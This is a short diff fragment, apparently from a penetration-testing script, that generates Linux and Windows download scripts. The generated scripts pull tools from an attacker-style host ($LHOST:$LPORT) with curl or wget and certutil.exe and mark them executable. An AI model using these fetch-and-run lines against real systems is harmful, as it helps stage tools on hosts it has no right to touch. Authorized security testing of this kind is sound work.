@@ -88,7 +88,7 @@ for TOOL_URL in $TOOL_URLS; do
     fi
 
     if [ $ARCH == "linux" ]; then
-        echo "wget http://$LHOST:$LPORT/$TOOL_NAME; chmod +x $TOOL_NAME" >> download.sh
+        echo "curl http://$LHOST:$LPORT/$TOOL_NAME > $TOOL_NAME; chmod +x $TOOL_NAME" >> download.sh
     fi
     if [ $ARCH == "windows" ]; then
         echo "certutil.exe -urlcache -split -f http://$LHOST:$LPORT/$TOOL_NAME $TOOL_NAME" >> download.bat
